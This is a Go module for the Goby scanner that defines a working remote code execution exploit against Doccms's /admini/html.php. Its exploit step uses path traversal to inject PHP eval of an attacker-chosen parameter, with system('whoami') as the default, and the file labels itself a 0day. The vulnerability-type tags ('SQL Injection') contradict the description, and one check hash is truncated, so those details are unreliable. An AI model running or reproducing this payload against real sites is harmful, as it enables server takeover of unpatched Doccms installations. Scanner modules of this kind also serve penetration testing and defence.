package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
  "regexp"
  "net/url"
  "encoding/base64"
  "crypto/md5"
)

func init() {
	expJson := `{
    "Name": "Doccms Frontend Code Execution Vulnerability",
    "Description": "<p>The Doccms system is a concise and practical company website display system developed by Zhuhai Jiu Shi Shi Technology Co., Ltd.</p><p>There is an arbitrary file inclusion vulnerability in the html.php file of the Doccms system 2021 and earlier versions, and attackers can obtain server permissions through the vulnerability.</p>",
    "Product": "doccms",
    "Homepage": "http://www.doccms.com",
    "DisclosureDate": "2022-08-10",
    "Author": "qiushui_sir@163.com",
    "FofaQuery": "body=\"Power by DocCms\"",
    "GobyQuery": "body=\"Power by DocCms\"",
    "Level": "3",
    "Impact": "<p>There is an arbitrary file inclusion vulnerability in the html.php file of the Doccms system 2021 and earlier versions, and attackers can obtain server permissions through the vulnerability.</p>",
    "Recommendation": "<p>1. The official has not fixed this vulnerability, please contact the manufacturer to fix it: <a href=\"http://www.doccms.com\">http://www.doccms.com</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
    "References": [
        "http://www.doccms.com"
    ],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "code",
            "type": "input",
            "value": "system(\"whoami\");",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admini/html.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);//\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b7",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/admini/html.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "8={{{code}}}&m=/../../../admini/views/system/lang/editTags.php&tags=1);echo md5(123);eval(stripslashes($_REQUEST[8]));echo md5(123);//\n"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "202cb962ac59075b964b07152d234b70",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|202cb962ac59075b964b07152d234b70([\\w\\W]+)202cb962ac59075b964b07152d234b70"
            ]
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2022-81308"
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "Doccms 前台代码执行漏洞",
            "Product": "doccms",
            "Description": "<p>Doccms系统是由<span style=\"color: rgb(62, 62, 62);\">珠海玖时光科技有限公司开发的一款<span style=\"color: rgb(62, 62, 62);\">简洁实用的公司网站展示系统。</span></span></p><p><font color=\"#3e3e3e\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Doccms系统2021及之前的</span>版本的html.php文件存在任意文件包含漏洞，攻击者可以通过漏洞获取服务器权限。</font><span style=\"color: rgb(62, 62, 62);\"><span style=\"color: rgb(62, 62, 62);\"><br></span></span></p>",
            "Recommendation": "<p>1、官方未修复该漏洞，请用户联系厂商进行修复：<a href=\"http://www.doccms.com\">http://www.doccms.com</a></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p><span style=\"font-size: 16px; color: rgb(22, 28, 37);\">Doccms系统2021及之前的</span><span style=\"color: rgb(62, 62, 62); font-size: 16px;\">版本的html.php文件存在任意文件包含漏洞，攻击者可以通过漏洞获取服务器权限。</span><br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Doccms Frontend Code Execution Vulnerability",
            "Product": "doccms",
            "Description": "<p>The Doccms system is a concise and practical company website display system developed by Zhuhai Jiu Shi Shi Technology Co., Ltd.</p><p>There is an arbitrary file inclusion vulnerability in the html.php file of the Doccms system 2021 and earlier versions, and attackers can obtain server permissions through the vulnerability.<br></p>",
            "Recommendation": "<p>1. The official has not fixed this vulnerability, please contact the manufacturer to fix it: <a href=\"http://www.doccms.com\">http://www.doccms.com</a></p><p>2. Deploy a Web application firewall to monitor database operations.</p><p>3. If it is not necessary, it is forbidden to access the system from the public network.</p>",
            "Impact": "<p>There is an arbitrary file inclusion vulnerability in the html.php file of the Doccms system 2021 and earlier versions, and attackers can obtain server permissions through the vulnerability.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10706"
}`



	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}